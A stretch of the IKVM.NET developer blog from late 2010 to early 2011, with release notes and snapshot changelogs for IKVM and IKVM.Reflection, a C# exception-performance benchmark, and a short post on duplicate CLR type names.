</div></div><div class="date"><h2 class="dateHeader">Wednesday, 16 March 2011</h2></div>
<div class="newsItems"><a name="adcbc9104-320f-40b5-9617-b0da360ce495"></a><div class="entry">
	<h3 class="entryTitle">.NET/C# Generics History</h3>
	<div class="entryBody">
		<P>Yesterday Don Syme posted a short <A href="http://blogs.msdn.com/b/dsyme/archive/2011/03/15/net-c-generics-history-some-photos-from-feb-1999.aspx">history of .NET/C# generics</A>.</P>
<P>Wow. Just wow.</P>
<P>I knew MSR was instrumental in getting generics into the CLR, but not that it was this critical.</P>
<P>Thank you Don Syme, Andrew Kennedy, et al.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/16/2011 06:41:40 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=dcbc9104-320f-40b5-9617-b0da360ce495"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=dcbc9104-320f-40b5-9617-b0da360ce495">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 03 March 2011</h2></div>
<div class="newsItems"><a name="aa08e3c59-1f72-49fa-8bf9-3121bc1648b2"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.46 Release Candidate 0</h3>
	<div class="entryBody">
		<P>Finally, after way too long, the first 0.46 release candidate is available.</P>
<P>What's New (relative to <A HREF="/PermaLink.aspx?guid=6f3a513b-cba7-497e-be25-82ba96e13f40">IKVM.NET 0.44</A>):</P>
<UL>
<LI>Integrated OpenJDK 6 b22.</LI>
<LI>Added -Xreference: option to ikvm.exe and ikvm.runtime.Startup.addBootClassPathAssemby() API.</LI>
<LI>The binaries zip now includes lib/ikvm-api.jar to avoid having to run ikvmstub to get access to the IKVM Java APIs.</LI>
<LI>Ported parts of fdlibm to C# to use for StrictMath methods tan, cbrt, floor, pow, hypot, expm1 and log1p. </LI>
<LI>Add support for serializing .NET exceptions in Java. We don't serialize the actual object, but a placeholder instead, to avoid having to implement full .NET serialization interop.</LI>
<LI>Added IL optimization step to code generator.</LI>
<LI>Added <A HREF="/PermaLink.aspx?guid=acb57d2a-c07a-4838-909a-3d073bdbfdf5">SynchronizationContext</A> for AWT event thread.</LI>
<LI>Many IKVM.Reflection improvements and bug fixes.</LI>
<LI>Many Swing/AWT improvements.</LI>
<LI>Implemented IPv6 support (.NET only) for java.net package APIs.</LI>
<LI>The sun.boot.class.path system property now points to VFS to allow javac to work (although a bit slow, because the boot class files are dynamically generated on demand).</LI>
<LI><A HREF="/PermaLink.aspx?guid=ac6cfb6a-6138-4c36-895e-636c77242e39">Resource and generated stub classes</A> are now projected into the virtual IKVM home directory, to make code that assumes that resources live in jars happy.</LI>
<LI>Improvements to @ikvm.lang.Internal handling.</LI>
<LI>Many minor improvements.</LI></UL>
<P>Fixes since previous development snapshot:</P>
<UL>
<LI>IKVM.Reflection: Added limited support for #- metadata stream ("uncompressed" table heap). ParamPtr table is not yet implemented.</LI>
<LI>IKVM.Reflection: Fixed bug in CustomAttributeData.__ToBuilder(). Array values should be unwrapped.</LI>
<LI>IKVM.Reflection: Added __GetBlob() API extension to allow custom attribute arguments to be parsed/used even when some of the argument types are missing.</LI>
<LI>IKVM.Reflection: Fixed stack height computation bug. For a newobj the parameters should be popped before the new object is pushed. Previously we could set the maximum stack height one slot too high.</LI>
<LI>IKVM.Reflection: Added ConstructorBuilder.__SetSignature() API extension to allow constructor to be defined before the parameter types are available and to allow return type custom modifiers.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.46.0.0.zip">ikvmbin-0.46.0.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.46.0.0.zip">ikvmsrc-0.46.0.0.zip</A>, <A href="http://www.frijters.net/openjdk6-b22-stripped.zip">openjdk6-b22-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/03/2011 14:33:03 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a08e3c59-1f72-49fa-8bf9-3121bc1648b2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a08e3c59-1f72-49fa-8bf9-3121bc1648b2">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 02 March 2011</h2></div>
<div class="newsItems"><a name="a1d741244-cbdd-4664-86dd-5794d6703ce2"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P><A href="http://blogs.sun.com/darcy/entry/openjdk_6_b22_sourcebundle">OpenJDK 6 b22</A> has been integrated.</P>
<P>Changes:</P>
<UL>
<LI>Integrated OpenJDK 6 b22.</LI>
<LI>Fixed runtime to not convert assembly class loader construction exceptions into critical failure, because critical failure is of dubious value and exception might be handleable by client code.</LI>
<LI>Fixed ProtectionDomain. Use Assembly.EscapedCodeBase to construct CodeSource url, instead of unescaped CodeBase.</LI>
<LI>Allow @ikvm.lang.Internal methods to implement an interface method.</LI>
<LI>Fixed ikvmc to ignore @ikvm.lang.Internal annotation on interface methods and emit a warning.</LI>
<LI>IKVM.Reflection: Fixed exception table sorting bug.</LI>
<LI>IKVM.Reflection: Allow mcs to avoid mdb/pdb writer dependencies.</LI>
<LI>IKVM.Reflection: Added Mono Ref.Emit compatibility feature to allow modules currently in use to be overwritten.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.4078.zip">ikvmbin-0.45.4078.zip</A></P>
<P>OpenJDK 6 b22 stripped sources: <A href="http://www.frijters.net/openjdk6-b22-stripped.zip">openjdk6-b22-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/02/2011 09:25:17 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1d741244-cbdd-4664-86dd-5794d6703ce2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1d741244-cbdd-4664-86dd-5794d6703ce2">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 25 February 2011</h2></div>
<div class="newsItems"><a name="a67a178a3-0e17-473f-b427-09b1e0040996"></a><div class="entry">
	<h3 class="entryTitle">CLR Type Names</h3>
	<div class="entryBody">
		<P>Type names look like a simple concept. Every type has a unique name within the assembly that defines it.</P>
<P>It turns out that there is a slight complication. Even though the CLI specification and the reflection API suggest that a type name is simply a string, in reality it is a pair of strings: { namespace, name }</P>
<P>Here's some code that uses IKVM.Reflection to generate an interesting assembly:</P>
<P><CODE><SPAN style="COLOR: blue">using</SPAN> IKVM.Reflection;<BR><SPAN style="COLOR: blue">using</SPAN> IKVM.Reflection.Emit;<BR><BR><SPAN style="COLOR: blue">class</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">static void </SPAN>Main() {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var </SPAN>universe = <SPAN style="COLOR: blue">new </SPAN><SPAN style="COLOR: #2b91af">Universe</SPAN>();<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var </SPAN>ab = universe.DefineDynamicAssembly(<SPAN style="COLOR: blue">new </SPAN><SPAN style="COLOR: #2b91af">AssemblyName</SPAN>(<SPAN style="COLOR: #a31515">"Test"</SPAN>), <SPAN style="COLOR: #2b91af">AssemblyBuilderAccess</SPAN>.Save);<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var </SPAN>modb = ab.DefineDynamicModule(<SPAN style="COLOR: #a31515">"Test"</SPAN>, <SPAN style="COLOR: #a31515">"Test.dll"</SPAN>);<BR>&nbsp;&nbsp;&nbsp; modb.__DefineType(<SPAN style="COLOR: #a31515">"A.B"</SPAN>, <SPAN style="COLOR: #a31515">"C"</SPAN>).CreateType();<BR>&nbsp;&nbsp;&nbsp; modb.__DefineType(<SPAN style="COLOR: #a31515">"A"</SPAN>, <SPAN style="COLOR: #a31515">"B.C"</SPAN>).CreateType();<BR>&nbsp;&nbsp;&nbsp; ab.Save(<SPAN style="COLOR: #a31515">"Test.dll"</SPAN>);<BR>&nbsp; }<BR>}</CODE></P>
<P>This creates a valid (and verifiable) assembly containing two different types, both named A.B.C.</P>
<P>If you disassemble this assembly with ildasm and the resulting IL is reassembled with ilasm you won't end up with the same assembly. I don't know if there are any obfuscators that use this trick, but maybe they should.</P>
<P>Reflection APIs assume that the last dot in the type name separates the namespace from the name, so doing Type.GetType("A.B.C") will return the first type {"A.B", "C"}.&nbsp;You can&nbsp;get the second type by enumerating all types in the assembly.</P>
<P>Note that static binding just works, because in that case the {namespace, name} pair is specified explicitly.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/25/2011 09:09:01 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=67a178a3-0e17-473f-b427-09b1e0040996"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=67a178a3-0e17-473f-b427-09b1e0040996">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 21 February 2011</h2></div>
<div class="newsItems"><a name="ac84a5b22-d633-4eeb-a8e1-244ff66161a2"></a><div class="entry">
	<h3 class="entryTitle">Exception Performance Part 3</h3>
	<div class="entryBody">
		<P>This is the final part of three part series on exception performance that started in 2008. Previous parts are:<BR><A href="/PermaLink.aspx?guid=062e4506-89c4-488e-9104-59c1ec80007b">Exception Performance Part 1</A><BR><A href="/PermaLink.aspx?guid=388b2a6d-e7b2-4ffa-86e7-450c87e6178f">Exception Performance Part 2</A> </P>
<P>Let's introduce a slight variation of ExceptionPerf1 where we throw 10000 exceptions instead of 100000 and throw the exception from a method, instead of directly in the loop. </P>
<P><CODE><SPAN style="COLOR: blue">using</SPAN> System;<BR><SPAN style="COLOR: blue">using</SPAN> System.Diagnostics;<BR><BR><SPAN style="COLOR: blue">class</SPAN> <SPAN style="COLOR: #2b91af">ExceptionPerf5</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">static void</SPAN> Main() {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">var</SPAN> sw = <SPAN style="COLOR: #2b91af">Stopwatch</SPAN>.StartNew();<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">for</SPAN> (<SPAN style="COLOR: blue">int</SPAN> i = 0; i &lt; 10000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">try</SPAN> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Foo();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <SPAN style="COLOR: blue">catch</SPAN> { }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; sw.Stop();<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(sw.ElapsedMilliseconds);<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Console</SPAN>.ReadLine();<BR>&nbsp; }<BR><BR>&nbsp; <SPAN style="COLOR: blue">private static</SPAN> <SPAN style="COLOR: blue">void</SPAN> Foo() {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">throw new</SPAN> <SPAN style="COLOR: #2b91af">Exception</SPAN>();<BR>&nbsp; }<BR>}</CODE> </P>
<P>When this is compiled with the standard Debug configuration in Visual Studio 2010 it yields the following performance numbers (times in milliseconds) when run either with Ctrl-F5 (i.e. no debugger attached) or F5 (debugger attached): </P>
<P>
<TABLE border=0 cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">&nbsp;</TD>
<TD style="BORDER-RIGHT: black 1px solid" align=center>HotSpot 1.6</TD>
<TD style="BORDER-RIGHT: black 1px solid" colSpan=2 align=center>.NET 2.0</TD>
<TD colSpan=2 align=center>.NET 4.0 </TD></TR>
<TR>
<TD style="BORDER-BOTTOM: black 1px solid; BORDER-RIGHT: black 1px solid">&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 1px solid; BORDER-RIGHT: black 1px solid" align=right>x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" width=60 align=right>x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid; BORDER-RIGHT: black 1px solid" width=60 align=right>x64</TD>
<TD style="BORDER-BOTTOM: black 1px solid" width=60 align=right>x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" width=60 align=right>x64</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">Ctrl-F5</TD>
<TD style="BORDER-RIGHT: black 1px solid" align=right>25</TD>
<TD align=right>286</TD>
<TD style="BORDER-RIGHT: black 1px solid" align=right>413</TD>
<TD align=right>292</TD>
<TD align=right>305</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">F5</TD>
<TD style="BORDER-RIGHT: black 1px solid" align=right>&nbsp;</TD>
<TD align=right>16950</TD>
<TD style="BORDER-RIGHT: black 1px solid" align=right>16134</TD>
<TD align=right>45223</TD>
<TD align=right>114790</TD></TR></TBODY></TABLE></P>
<P>For comparison, the table also includes the time it takes to run the equivalent code in HotSpot 1.6 Client VM on x86.</P>
<P>As we saw in the previous two articles on exception performance, .NET is significantly slower in handling exceptions, so that is not surprising. However, what is surprising is how much the overhead is of simply having the debugger attached. </P>
<P>Another depressing thing to note is that things have gotten much worse with .NET 4.0.</P>
<P>Unfortunately, many developers have the habit of always running their code in the debugger, so when they first try code IKVM.NET compiled code from within Visual Studio they often get a very bad impression of the performance, simply because the debugger sucks.</P>
<P>I considered filing a connect bug for this, but you know they'll just close it as By Design. I guess the CLR is only a Common Language Runtime, if you language doesn't use exceptions for control flow.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/21/2011 09:46:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c84a5b22-d633-4eeb-a8e1-244ff66161a2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c84a5b22-d633-4eeb-a8e1-244ff66161a2">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 17 February 2011</h2></div>
<div class="newsItems"><a name="a9c821dd7-d0b4-43df-a7fc-40eca7d0c6d7"></a><div class="entry">
	<h3 class="entryTitle">Mono 2.10 Released</h3>
	<div class="entryBody">
		<P><A href="http://www.mono-project.com/Release_Notes_Mono_2.10">Mono 2.10</A> was released this week. It includes a version of the Mono C# compiler that uses IKVM.Reflection as its <A href="http://www.mono-project.com/Release_Notes_Mono_2.10#New_C.23_Compiler_Backend">back end</A>.</P>
<P>Last year&nbsp;in the two days before&nbsp;FOSDEM I hacked mcs to use IKVM.Reflection and while at FOSDEM I&nbsp;showed this hack to <A href="http://tirania.org/blog/archive/2010/Apr-27.html">Miguel</A> and was met with his usual enthusiasm and he told me that he was already planning on talking to me about using IKVM.Reflection for mcs.</P>
<P>In May, Korn&#233;l P&#225;l did a,&nbsp;much more complete than my hack, prototype port of mcs to IKVM.Reflection and that resulted in a number of IKVM.Reflection bug fixes and enhancements.</P>
<P>Last&nbsp;November, Marek Safar starting work on integrating IKVM.Reflection support for real and made sure that everything was production ready. This resulted in some mcs restructuring and yet more IKVM.Reflection fixes,&nbsp;features&nbsp;and also performance improvements.</P>
<P>The result of all this is that now IKVM.Reflection is a great library to use if you have a codebase that has both a dynamic and a static compilation mode (as both IKVM.NET and mcs have), because you can easily share the bulk of your code between System.Reflection and IKVM.Reflection without having to suffer from the (significant) limitations of System.Reflection for the static scenario.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/17/2011 06:59:38 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9c821dd7-d0b4-43df-a7fc-40eca7d0c6d7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9c821dd7-d0b4-43df-a7fc-40eca7d0c6d7">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 15 February 2011</h2></div>
<div class="newsItems"><a name="a9e80a221-8e1c-4046-8f85-f316b21e26ec"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I decided to delay the 0.46 release to wait for OpenJDK 6 build 22, which&nbsp;will be&nbsp;a security update and should be available soon. In the mean time, here is a new development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Fixed some compilation warnings. 
<LI>Fix for the timezone used to convert .NET DateTime to Java timezone in the JDBC-ODBC bridge. 
<LI>Fix for bug # <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=3129981&amp;group_id=69637&amp;atid=525264">3129981</A>. 
<LI>Fixed .NET 4.0 build verification issue. 
<LI>IKVM.Reflection: Enabled framework unification support. 
<LI>IKVM.Reflection: Avoid re-firing the assembly resolve event for missing assemblies. 
<LI>IKVM.Reflection: Several performance tweaks by Marek Safar. 
<LI>IKVM.Reflection: Added feature to (optionally) allow resolving of missing methods. 
<LI>IKVM.Reflection: Added [Constructor|Method]Builder.__ReleaseILGenerator() API to eagerly bake the method body and release the ILGenerator.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.4062.zip">ikvmbin-0.45.4062.zip</A><BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/15/2011 07:54:58 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9e80a221-8e1c-4046-8f85-f316b21e26ec"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9e80a221-8e1c-4046-8f85-f316b21e26ec">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 25 January 2011</h2></div>
<div class="newsItems"><a name="af4994c94-8c80-4ca2-9867-177a774b10ca"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot with OpenJDK 6 b21 integrated. If you want to build from cvs, from now on you'll need the OpenJDK 6 b21 sources (available in the zip linked below).</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="http://blogs.sun.com/darcy/entry/openjdk_6_b21_source_bundle">OpenJDK 6 b21</A>.</LI>
<LI>IKVM.Reflection: Mark modules as executable when running on Mono.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.4042.zip">ikvmbin-0.45.4042.zip</A></P>
<P>OpenJDK 6 b21 stripped sources: <A href="http://www.frijters.net/openjdk6-b21-stripped.zip">openjdk6-b21-stripped.zip</A><BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/25/2011 06:07:07 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f4994c94-8c80-4ca2-9867-177a774b10ca"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f4994c94-8c80-4ca2-9867-177a774b10ca">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 24 January 2011</h2></div>
<div class="newsItems"><a name="ae1623748-16d6-464c-8697-cd8b3c45dae2"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More IKVM.Reflection fixes to support mcs. Many thanks to Marek for his work.</P>
<P>OpenJDK 6 b21 has been released, so after this snapshot that needs to be integrated and we start preparing for the 0.46 release.</P>
<P>Changes:</P>
<UL>
<LI>Several AWT fixes.</LI>
<LI>Image improvements.</LI>
<LI>Added ikvm.runtime.Startup.addBootClassPathAssemby() API.</LI>
<LI>Added -Xreference: option to ikvm.</LI>
<LI>Fix scope id in IPv6 server socket accepted connections.</LI>
<LI>Added support for loading resources from assemblies loaded in the LoadFrom context.</LI>
<LI>Treat unrecognized ikvmc options as errors, instead of warnings.</LI>
<LI>Added ikvm.internal.NotYetImplementedError and throw that instread of sun.reflect.generics.reflectiveObjects.NotImplementedException.</LI>
<LI>Fixed bug that caused reflecting on a field of an unfinished type to throw an exception.</LI>
<LI>IKVM.Reflection: Fix for big endian systems. Thanks to Marek Safar for reporting this.</LI>
<LI>IKVM.Reflection: Add support for NETCF in rendering pseudo DllImportAttribute (i.e. skip fields that don't exist).</LI>
<LI>IKVM.Reflection: Changed __ReadTypeName() to __TryReadTypeName() because it should fail when the type is a nested type (because the name of a nested type cannot be expressed by namespace + name).</LI>
<LI>IKVM.Reflection: Type.Namespace property should not returned escaped string.</LI>
<LI>IKVM.Reflection: Added Type.__Name and Type.__Namespace properties to allow the real (from the ECMA CLI point of view) namespace and names of types to be queried (for TypeDef and TypeBuilder only).</LI>
<LI>IKVM.Reflection: Fixed a bunch of type name escaping bugs.</LI>
<LI>IKVM.Reflection: Added support for nested types that use a namespace.</LI>
<LI>IKVM.Reflection: Type.Name/Namespace/FullName fixes to make everything more compatible (including bugs) with .NET reflection.</LI>
<LI>IKVM.Reflection: Added ModuleBuider.__DefineType() and TypeBuilder.__DefineNestedType() APIs.</LI>
<LI>IKVM.Reflection: Prevent external subclassing. It's not part of the design to support that, now it is also enforced.</LI>
<LI>IKVM.Reflection: Fixed copy/paste bug. A TypeRef pointing to ModuleRef should resolve the type in that module, not the assembly.</LI>
<LI>IKVM.Reflection: Fixed Type.GetNestedType() and be more compatible with .NET reflection (i.e. ignore the namespace).</LI>
<LI>IKVM.Reflection: Added Universe.CreateMissingAssembly() to create an assembly that automatically resolves any type that it is supposed to contain.</LI>
<LI>IKVM.Reflection: Added Type.__IsMissing and Type.__ContainsMissingType properties to detect missing types.</LI>
<LI>IKVM.Reflection: Patch by Marek Safar to implement framework unification for managed implementation of Universe.CompareAssemblyIdentity().</LI>
<LI>IKVM.Reflection: Improved partial trust support.</LI>
<LI>IKVM.Reflection: Added support for saving to a stream instead of a file.</LI>
<LI>IKVM.Reflection: Fixed type resolution to match namespace and name separately, like Mono and the CLR do.</LI>
<LI>IKVM.Reflection: Added Universe.EnableMissingTypeResolution() to enable missing type resolution in all assemblies.</LI>
<LI>IKVM.Reflection: Various fixes to improve support for building mscorlib.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.4041.zip">ikvmbin-0.45.4041.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/24/2011 07:08:30 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e1623748-16d6-464c-8697-cd8b3c45dae2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e1623748-16d6-464c-8697-cd8b3c45dae2">Comments [7]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 27 December 2010</h2></div>
<div class="newsItems"><a name="aaeae47c4-4110-457f-ac58-76880e759a23"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Several IKVM bug fixes as well as more IKVM.Reflection bug fixes and a couple of new APIs for issues found by Marek during his Mono C# compiler work.</P>
<P>I've also modified the build process to generate a stub jar for the IKVM.NET specific Java APIs, to remove the need to run ikvmstub on IKVM.OpenJDK.Core.dll. The stubs are now available in the binaries zip file (ikvm/lib/ikvm-api.jar).</P>
<UL>
<LI>Fixed ikvmstub to not mark abstract methods as native. 
<LI>Changed registry access (for java.util.prefs) on Windows to be more compatible with JDK and UAC aware. 
<LI>Added support for encoding incorrect annotation values and reporting the exception back when the annotation is queried. 
<LI>Fixed ikvmstub encoding of boolean annotation method defaults. 
<LI>System.mapLibraryName() should throw NPE for null arg. 
<LI>Ported parts of fdlibm to C# to use for StrictMath methods tan, cbrt, floor, pow, hypot, expm1 and log1p. 
<LI>Several awt fixes. 
<LI>Added ikvmstub -out: option and improved usage message. 
<LI>Added ikvmstub -namespace: option to only process types in the specified namespace(s). 
<LI>Generate lib/ikvm-api.jar to expose the ikvm API more easily to java code (by shipping this jar as part of ikvmbin.zip). 
<LI>Fix for NullReferenceException in ClassLoaderWrapper.LoadGenericClass() if type parameter type cannot be loaded. 
<LI>IKVM.Reflection: Delay creation of tokens for base type and interfaces until CreateType, to avoid problems when a non yet completely defined type is used as a base type or interface. 
<LI>IKVM.Reflection: Don't clear properties and events fields during CreateType. 
<LI>IKVM.Reflection: Call CreateType on TypeBuilder created by DefineInitializedData. 
<LI>IKVM.Reflection: Emit Param table records is correct order. 
<LI>IKVM.Reflection: HashAlgId in assembly manifest record turns out to be useless (SHA1 is always used). 
<LI>IKVM.Reflection: Custom attributes applied to GenericTypeParameterBuilder were attached to the type token, instead of the type parameter token. 
<LI>IKVM.Reflection: Added support for reading decimal parameter default values with ParamterInfo.RawDefaultValue. 
<LI>IKVM.Reflection: Added support for emitting assemblies with non-existing cultures. 
<LI>IKVM.Reflection: Fixed several ILGenerator bugs when __CleverExceptionBlockAssistance is used. 
<LI>IKVM.Reflection: Removed NotImplementedException for unsorted GenericParam table, because we don't really care. 
<LI>IKVM.Reflection: Exception block end label should be marked regardless of exception assistance mode. 
<LI>IKVM.Reflection: The end label of an exception block should always be marked, because you can also backward branch to it. 
<LI>IKVM.Reflection: Don't emit unnecessary leave instructions in "clever" mode. 
<LI>IKVM.Reflection: Added ModuleBuilder.__AddAssemblyReference() API to explicitly add assembly references. This can be used in conjunction with AssemblyBuilder.__AddModule() to add the assemblies referenced by the module to the assembly manifest module. It's not clear to me whether this is required, but Microsoft does it and Assembly.GetReferencedAssemblies() only returns the assemblies referenced from the manifest module. 
<LI>IKVM.Reflection: Added Module.__GetReferencedAssemblies() API. 
<LI>IKVM.Reflection: Sort PropertyMap table. Not required by the spec, but .NET does it and Mono requires it. 
<LI>IKVM.Reflection: Made CustomAttributeData more lazy (when all custom attributes are queried, regardless of type). 
<LI>IKVM.Reflection: Added CustomAttributeData.__ReadTypeName() to get the type name without resolving it. 
<LI>IKVM.Reflection: Fixed copy/paste bug in AssemblyBuilder.GetTypeImpl(). The modules list was iterated twice instead of looking through both modules and addedModules. 
<LI>IKVM.Reflection: AssemblyResolve event should fire before resolving to AssemblyBuilder. 
<LI>IKVM.Reflection: Don't create duplicate ClassLayout table records when using the DefineType overload that specifies the size and also applying a StructLayoutAttribute. </LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.4013.zip">ikvmbin-0.45.4013.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/27/2010 06:53:23 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=aeae47c4-4110-457f-ac58-76880e759a23"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=aeae47c4-4110-457f-ac58-76880e759a23">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 01 December 2010</h2></div>
<div class="newsItems"><a name="a1a2d289a-8394-4779-9056-aefeb101b3ba"></a><div class="entry">
